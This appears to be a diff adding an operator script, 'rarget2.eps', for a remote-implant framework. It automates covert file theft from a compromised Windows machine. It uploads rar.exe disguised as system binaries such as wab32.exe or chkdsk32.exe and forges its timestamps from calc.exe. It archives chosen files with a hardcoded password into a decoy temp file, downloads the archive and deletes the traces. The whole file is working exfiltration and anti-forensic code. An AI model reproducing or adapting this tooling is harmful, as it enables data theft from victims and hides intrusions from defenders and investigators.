@@ -1,0 +1,361 @@
+##################################################
+#rarget2.eps.eps
+#Version 0.1 - 04/03/2009    - the new hotness
+#Version 0.2 - 04/29/2009    - Fixed a bug when backgrounding the get, and quotes in get mask
+#
+#Fairly automated rar get. Just need to feed it file masks and it goes.
+#
+##################################################
+
+
+@echo off;
+string $tools = GetEnv("OPSDISKTOOLS");
+string $rsyspath = GetEnv("SYSPATH");
+string $rarpath;
+string $archivepath;
+string $localname;
+string $rar;
+string $archive;
+string $rarpw = "Uj9*P[2i)Bn5!f";
+string $files;
+int $count =0;
+int $fcount =1;
+bool $exitloop=false;
+bool $safe = true;
+bool $rarleft = false;
+bool $detect_quotes = false;
+
+echo "***********************";
+echo "*  RarGet Version 2   *";
+echo "***********************";
+echo "";
+
+Safetycheck($safe);
+ifnot($safe){  return false;}
+
+
+
+echo "Enter Files to get (full path). Wildcards acceptable.";
+echo "";
+echo "        Type DONE when all files entered.";
+echo "";
+
+
+while ($exitloop == false){
+  echo "";
+  echo "";
+  $files[$count] = GetInput("File $fcount");
+  if($files[$count] == "DONE"){$exitloop = true;}
+  DetectQuotes($files[$count],$detect_quotes);
+  if($detect_quotes){
+	echo "";
+	echo "        QUOTES DETECTED      NO QUOTES PLEASE     TRY AGAIN";
+	echo "";
+	}
+	else{$fcount++;$count++;}
+  }$fcount-=2;$count=0;
+  
+if($files[0] == "DONE"){ 
+  echo "";
+  echo "Nothing to archive";
+  echo "";
+  return true;
+}
+
+ValidPut($rarpath, $rar);
+echo "";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "Rar.exe: $rarpath\\$rar";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+ValidArchive($archivepath, $archive);
+echo "Archive: $archivepath\\$archive";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "Archive password: $rarpw";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "Files to archive:";
+
+while($count != $fcount){
+  echo "     $files[$count]";
+  $count++;
+}$count=0;
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "";
+ifnot(prompt"Do you want to continue?"){return true;}
+
+
+
+ifnot(`put "$tools\\rar.exe" -name "$rarpath\\$rar"`){
+  echo "";
+  echo "      !!  CAN'T FIND RAR.EXE LOCALLY!    !!";
+  echo "    I should expect to see it at:";
+  echo "          $tools\\rar.exe";
+  echo "";
+  return false;
+}
+`matchtimes "$rsyspath\\calc.exe" "$rarpath\\$rar"`;
+
+Checkrar($tools, $rarpath, $rar, $safe);
+
+ifnot($safe){
+  if(`del $rar -path "$rarpath"`){
+  echo "";
+  echo "-------------------------------------------------";
+  echo "$rarpath\\$rar  -   DELETED";
+  echo "-------------------------------------------------";
+  echo "";
+  }
+else{
+  echo "";
+  echo "unable to delete: $rarpath\\$rar";
+  echo "";
+  }
+  echo "Bailing!";
+  echo "";
+  return false;
+}
+echo "";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo " Running Rar. Depending on the amount and size, ";
+echo " this may take a minute. ";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "";
+while($count != $fcount){
+  `run -command "$rarpath\\$rar a -ri0:30 -ep -ep1 -hp$rarpw -inul \\"$archivepath\\$archive\\" \\"$files[$count]\\"" -redirect`;
+  $count++;
+}$count=0;
+
+@echo on;
+`dir $archivepath\\$archive`;
+@echo off;
+
+ifnot(`del $rar -path "$rarpath"`){
+  echo "************************************************";
+  echo "";
+  echo " UNABLE TO DELETE RAR";
+  echo " You will need to manually delete it.";
+  echo "";
+  echo " del $rar -path \"$rarpath\"";
+  echo "";
+  echo "************************************************";
+  $rarleft = true;
+}
+else{
+  echo "";
+  echo "-------------------------------------------------";
+  echo "$rarpath\\$rar  -   DELETED";
+  echo "-------------------------------------------------";
+  echo "";
+}
+
+echo "****************************************";
+echo "* The get is running in the foreground *";
+echo "****************************************";
+echo "";
+echo " $archivepath\\$archive";
+echo "";
+@record on;
+@echo on;
+`get $archive -path "$archivepath" -foreground`;
+@echo off;
+@record off;
+$localname = GetCmdData("LocalName");
+echo "";
+echo "";
+echo "*********************************";
+echo "*  pause if the get isnt done!  *";
+echo "*********************************";
+echo "";
+echo "";
+pause;
+ifnot(`del $archive -path $archivepath`){
+  echo "************************************************";
+  echo "";
+  echo " UNABLE TO DELETE ARCHIVE";
+  echo " Unless you already removed it.";
+  echo " You will need to manually delete it.";
+  echo "";
+  echo " del $archive -path \"$archivepath\"";
+  echo "";
+  echo "************************************************";
+}
+else{
+  echo "";
+  echo "-------------------------------------------------";
+  echo " $archivepath\\$archive  -  DELETED";
+  echo "-------------------------------------------------";
+  echo "";
+}
+echo "";
+echo "";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "      Get Complete             Uncompressing";
+echo "= - = - = - = - = - = - = - = - = - = - = - = - = - = - =";
+echo "";
+echo "";
+if($rarleft){
+  echo "************************************************";
+  echo "";
+  echo " UNABLE TO DELETE RAR";
+  echo " You will need to manually delete it.";
+  echo "";
+  echo " del $rar -path \"$rarpath\"";
+  echo "";
+  echo "************************************************";
+}
+Uncompress($localname,$tools,$rarpw);
+
+
+
+
+
+#---------------------------------------------------------------
+# Uncompress downloaded rar
+#---------------------------------------------------------------
+sub Uncompress(in string $localname, in string $tools, in string $rarpw){
+  @record on;
+  `local pwd`;
+  @record off;
+  string $pwd =GetCmdData("string_val");
+  `local cd Get_Files`;
+  `local run -command "$tools\\rar.exe e -hp$rarpw $localname"`;
+  `local cd $pwd`;
+}
+
+
+
+
+#---------------------------------------------------------------
+# Check uploaded rar
+#---------------------------------------------------------------
+Sub Checkrar(in string $tools, in string $rarpath, in string $rar, out bool $good){
+  @echo off;
+  string $checksuma;
+  string $checksumb;
+  @record on;
+  `local checksum -mask rar.exe -path "$tools"`;
+  @record off;
+  $checksuma=GetCmdData("checksum_value");
+  @record on;
+  `checksum -mask $rar -path "$rarpath"`;
+  @record off;
+  $checksumb=GetCmdData("checksum_value");
+  if($checksuma != $checksumb){
+    echo "";
+    echo "*********************************************************";
+    echo "*  Uploaded rar checksum does not match local checksum  *";
+    echo "*********************************************************";
+    echo "";
+    $good = false;
+    return true;
+  }
+  $good = true;
+}
+
+#---------------------------------------------------------------
+# Safety Checks
+#---------------------------------------------------------------
+sub Safetycheck (out bool $safe){
+  @record on;
+if(`memory`) {
+	@record off;
+  $safe = true;
+  int $load = GetCmdData("memPhysLoad");
+	if ($load > 85) {
+		if(prompt "Physical load is at $load percent. Are you sure you want to continue?") {
+			# Do nothing: Continue
+		} else {
+      $safe = false;
+      return false;
+		}
+	}
+} else {
+  @record off;
+	echo "Couldn't determine physical load. Proceed with caution.";
+  }
+}
+
+
+
+
+#---------------------------------------------------------------
+#  Generate a random number in a given range  rand(from#, to#, output#)
+#---------------------------------------------------------------
+Sub Rand_range(IN int $rmin , IN int $rmax, OUT int $rand){
+  @echo off;
+  @record on;
+  `local run -command "perl -e \\"print $rmin + int rand($rmax-$rmin+1)\\"" -redirect`;
+  @record off;
+  string $preint = GetCmdData("output");
+  $rand = <int>$preint;
+  }
+
+
+#----------------------------------------------------------------
+# Function to find a valid location to save rar archive
+#----------------------------------------------------------------
+Sub ValidArchive(out string $path, out string $archive){
+  @echo off;
+  int $rand;
+  bool $done = false;
+  $path = GetEnv("TMPPATH");
+  while($done == false){
+  Rand_range(11,99,$rand);
+  $archive = <string>$rand;
+  $archive = "~WN$archive.tmp";
+  ifnot(`getfileattribs -file $path\\$archive`){$done=true;}
+  }
+}
+  
+  
+  
+
+#----------------------------------------------------------------
+# Function to find a valid location to save rar.exe
+#----------------------------------------------------------------
+Sub ValidPut (out string $path, out string $binary){
+  @echo off;
+  bool $valid;
+  
+  if(`dir "C:\\Program Files\\Common Files\\System"`){
+    ifnot(`getfileattribs -file "C:\\Program Files\\Common Files\\System\\wab32.exe"`){
+      $path = "C:\\Program Files\\Common Files\\System";
+      $binary = "wab32.exe";
+    }
+    else{
+      if(`getfileattribs -file "C:\\Program Files\\Common Files\\System\\wab32res.exe"`){
+      $path = GetEnv("SYSPATH");
+      ifnot(`getfileattribs -file "$path\\chkdsk32.exe"`){
+        $binary = "chkdsk32.exe";
+      }
+      else{
+		echo "";
+		echo "---------------------------";
+		echo "Cant find a good binary name.";
+        $binary = GetInput("Enter a binary name to place in $path");
+        }
+      }
+      
+      else{
+        $path = "C:\\Program Files\\Common Files\\System";
+        $binary = "wab32res.exe";
+        }
+      }
+    }
+  }
+  
+#----------------------------------------------------------------
+# Detect quotes from input string  
+#----------------------------------------------------------------
+Sub DetectQuotes (in string $in, out bool $out){
+string $quotes = "\"";
+@echo off;
+$out = false;
+string $q_parts =split($quotes,$in);
+int $q_size =sizeof($q_parts);
+if ($q_size > 1){
+	$out = true;
+	}
+	return true;
+}
+  
+  
